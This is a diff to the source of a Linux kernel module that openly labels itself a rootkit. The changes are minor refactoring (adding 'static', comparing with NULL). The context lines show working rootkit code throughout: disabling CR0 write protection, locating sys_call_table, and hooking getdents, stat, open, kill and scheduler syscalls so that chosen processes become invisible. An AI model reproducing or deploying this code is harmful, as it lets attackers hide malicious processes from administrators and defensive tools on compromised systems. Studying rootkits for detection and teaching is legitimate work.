@@ -14,11 +14,11 @@
 
 #define write_cr0(val) asm volatile("mov %0, %%cr0":"+r" (val), "+m" (__force_order));
 
-void ENABLE_WRITE(void){
+static void ENABLE_WRITE(void){
 	unsigned long val = read_cr0() & (~(1<<WP_BIT_IN_CR0));
 	write_cr0(val)
 }
-void DISABLE_WRITE(void){
+static void DISABLE_WRITE(void){
 	unsigned long val = read_cr0() | (1<<WP_BIT_IN_CR0);
 	write_cr0(val)
 }
@@ -42,7 +42,7 @@ struct linux_dirent64 {
 	char            d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
 };
 
-unsigned long *syscall_table = NULL;
+static unsigned long *syscall_table = NULL;
 
 // HOOK DEFINING MACROS ---------------------------------------------
 #define sys_orig(name) sys_##name##_orig
@@ -74,9 +74,9 @@ unsigned long *syscall_table = NULL;
 
 //similar to how kernel defines syscalls using SYSCALL_DEFINEx
 #define hook_define(n_args, ret_type, name, ...)                                            \
-	asmlinkage ret_type sys_do_hook(name)(DECL_DO_HOOK(n_args, __VA_ARGS__));               \
-	asmlinkage ret_type (*sys_orig(name))(DECL_ORIG_HOOK(n_args, __VA_ARGS__));             \
-	asmlinkage ret_type sys_hook(name)(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
+	static asmlinkage ret_type sys_do_hook(name)(DECL_DO_HOOK(n_args, __VA_ARGS__));               \
+	static asmlinkage ret_type (*sys_orig(name))(DECL_ORIG_HOOK(n_args, __VA_ARGS__));             \
+	static asmlinkage ret_type sys_hook(name)(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
 		ret_type ret = sys_do_hook(name)(ARGS_DO_HOOK(n_args, __VA_ARGS__));                \
 		return ret;                                                                         \
 	}
@@ -107,7 +107,7 @@ hook_define(2, long, sched_rr_get_interval, pid_t, pid, void __user *, interval)
 hook_define(2, long, kill, pid_t, pid, int, sig)
 
 #define sys_getdents_do_hook_define(v)                                                               \
-asmlinkage long sys_getdents##v##_do_hook(unsigned int fd, struct linux_dirent##v __user* dirent, unsigned int count, const struct pt_regs* regs) { \
+static asmlinkage long sys_getdents##v##_do_hook(unsigned int fd, struct linux_dirent##v __user* dirent, unsigned int count, const struct pt_regs* regs) { \
 	int buff_offset, deleted_size;                                                                   \
 	struct linux_dirent##v* currnt;                                                                  \
 	struct linux_dirent##v* my_dirent; \
@@ -150,7 +150,7 @@ asmlinkage long sys_getdents##v##_do_hook(unsigned int fd, struct linux_dirent##
 sys_getdents_do_hook_define()
 sys_getdents_do_hook_define(64)
 
-int check_pid_in_pathname(const char __user *pathname, const char* syscall_caller){
+static int check_pid_in_pathname(const char __user *pathname, const char* syscall_caller){
 	int pid;
 	if ((pid = pathname_includes_pid(pathname)) != -1){
 		log(KERN_INFO "ROOTKIT: Hidden process %d from call to %s\n", pid, syscall_caller);
@@ -159,7 +159,7 @@ int check_pid_in_pathname(const char __user *pathname, const char* syscall_calle
 	return 0;
 }
 
-int check_pid(int pid, const char* syscall_caller){
+static int check_pid(int pid, const char* syscall_caller){
 	if (is_pid_hidden(pid)){
 		log(KERN_INFO "ROOTKIT: Hidden process %d from call to %s\n", pid, syscall_caller);
 		return -1;
@@ -167,67 +167,67 @@ int check_pid(int pid, const char* syscall_caller){
 	return 0;
 }
 
-asmlinkage long sys_stat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
+static asmlinkage long sys_stat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
 	if (check_pid_in_pathname(pathname, "stat") == -1) return -ENOENT;
 	return sys_stat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
 }
 
-asmlinkage long sys_lstat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
+static asmlinkage long sys_lstat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
 	if (check_pid_in_pathname(pathname, "lstat") == -1) return -ENOENT;
 	return sys_lstat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
 }
 
-asmlinkage long sys_chdir_do_hook(const char __user *pathname, const struct pt_regs* regs){
+static asmlinkage long sys_chdir_do_hook(const char __user *pathname, const struct pt_regs* regs){
 	if (check_pid_in_pathname(pathname, "chdir") == -1) return -ENOENT;
 	return sys_chdir_orig(ARGS_ORIG(1, const char __user*, pathname));
 }
 
-asmlinkage long sys_getpriority_do_hook(int which, int who, const struct pt_regs* regs){
+static asmlinkage long sys_getpriority_do_hook(int which, int who, const struct pt_regs* regs){
 	if (which == PRIO_PROCESS && check_pid(who, "getpriority") == -1) return -ENOENT;
 	return sys_getpriority_orig(ARGS_ORIG(2, int, which, int, who));
 }
 
-asmlinkage long sys_open_do_hook(const char __user *pathname, int flags, umode_t mode, const struct pt_regs* regs){
+static asmlinkage long sys_open_do_hook(const char __user *pathname, int flags, umode_t mode, const struct pt_regs* regs){
 	if (check_pid_in_pathname(pathname, "open") == -1) return -ENOENT;
 	return sys_open_orig(ARGS_ORIG(3, const char __user*, pathname, int, flags, umode_t, mode));
 }
 
-asmlinkage long sys_openat_do_hook(int dfd, const char __user *pathname, int flags, umode_t mode, const struct pt_regs* regs){
+static asmlinkage long sys_openat_do_hook(int dfd, const char __user *pathname, int flags, umode_t mode, const struct pt_regs* regs){
 	if (check_pid_in_pathname(pathname, "openat") == -1) return -ENOENT;
 	return sys_openat_orig(ARGS_ORIG(4, int, dfd, const char __user*, pathname, int, flags, umode_t, mode));
 }
 
-asmlinkage long sys_getpgid_do_hook(pid_t pid, const struct pt_regs* regs){
+static asmlinkage long sys_getpgid_do_hook(pid_t pid, const struct pt_regs* regs){
 	if (check_pid(pid, "getpgid") == -1) return -ESRCH;
 	return sys_getpgid_orig(ARGS_ORIG(1, pid_t, pid));
 }
 
-asmlinkage long sys_getsid_do_hook(pid_t pid, const struct pt_regs* regs){
+static asmlinkage long sys_getsid_do_hook(pid_t pid, const struct pt_regs* regs){
 	if (check_pid(pid, "getsid") == -1) return -ESRCH;
 	return sys_getsid_orig(ARGS_ORIG(1, pid_t, pid));
 }
 
-asmlinkage long sys_sched_getaffinity_do_hook(pid_t pid, unsigned int len, unsigned long __user *user_mask_ptr, const struct pt_regs* regs){
+static asmlinkage long sys_sched_getaffinity_do_hook(pid_t pid, unsigned int len, unsigned long __user *user_mask_ptr, const struct pt_regs* regs){
 	if (check_pid(pid, "sched_getaffinity") == -1) return -ESRCH;
 	return sys_sched_getaffinity_orig(ARGS_ORIG(3, pid_t, pid, unsigned int, len, unsigned long __user*, user_mask_ptr));
 }
 
-asmlinkage long sys_sched_getparam_do_hook(pid_t pid, struct sched_param __user *param, const struct pt_regs* regs){
+static asmlinkage long sys_sched_getparam_do_hook(pid_t pid, struct sched_param __user *param, const struct pt_regs* regs){
 	if (check_pid(pid, "sched_getparam") == -1) return -ESRCH;
 	return sys_sched_getparam_orig(ARGS_ORIG(2, pid_t, pid, struct sched_param __user *, param));
 }
 
-asmlinkage long sys_sched_getscheduler_do_hook(pid_t pid, const struct pt_regs* regs){
+static asmlinkage long sys_sched_getscheduler_do_hook(pid_t pid, const struct pt_regs* regs){
 	if (check_pid(pid, "sched_getscheduler") == -1) return -ESRCH;
 	return sys_sched_getscheduler_orig(ARGS_ORIG(1, pid_t, pid));
 }
 
-asmlinkage long sys_sched_rr_get_interval_do_hook(pid_t pid, void __user *interval, const struct pt_regs* regs){
+static asmlinkage long sys_sched_rr_get_interval_do_hook(pid_t pid, void __user *interval, const struct pt_regs* regs){
 	if (check_pid(pid, "sched_rr_get_interval") == -1) return -ESRCH;
 	return sys_sched_rr_get_interval_orig(ARGS_ORIG(2, pid_t, pid, void __user *, interval));
 }
 
-asmlinkage long sys_kill_do_hook(pid_t pid, int sig, const struct pt_regs* regs){
+static asmlinkage long sys_kill_do_hook(pid_t pid, int sig, const struct pt_regs* regs){
 	if (check_pid(pid, "kill") == -1) return -ESRCH;
 	return sys_kill_orig(ARGS_ORIG(2, pid_t, pid, int, sig));
 }
@@ -235,7 +235,7 @@ asmlinkage long sys_kill_do_hook(pid_t pid, int sig, const struct pt_regs* regs)
 
 //__init para que solo lo haga una vez y después pueda sacarlo de memoria
 int __init hooks_init(void){
-	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == 0){
+	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == NULL){
 		log(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
 		return -1;
 	}
